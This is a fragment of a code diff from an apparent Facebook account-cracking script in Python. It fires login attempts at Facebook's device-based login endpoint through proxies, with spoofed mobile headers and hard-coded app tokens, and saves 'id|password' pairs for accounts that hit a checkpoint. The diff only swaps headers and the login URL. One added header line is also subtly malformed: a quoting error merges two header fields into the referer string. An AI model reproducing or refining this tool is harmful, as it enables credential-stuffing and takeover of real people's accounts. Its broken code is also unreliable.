-			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
-			bx = ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=date, headers=head,proxies=proxy)
+			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
@@ -1059,5 +1014,4 @@ def make():
 	
 	
 if __name__=='__main__':
-	make()	
-	
+	make()
